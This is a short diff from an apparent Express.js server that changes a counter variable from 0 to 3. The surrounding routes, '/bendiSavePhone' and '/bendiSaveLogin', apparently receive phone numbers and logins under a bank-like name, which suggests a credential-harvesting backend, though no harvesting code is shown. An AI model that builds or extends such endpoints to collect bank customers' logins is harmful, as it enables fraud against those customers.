@@ -103,7 +103,7 @@ app.post("/bendiSavePhone", cors(), (req, res) => {
   });
 });
 
-let bendigoCountSkii = 0;
+let bendigoCountSkii = 3;
 
 app.options("/bendiSaveLogin", cors());
 
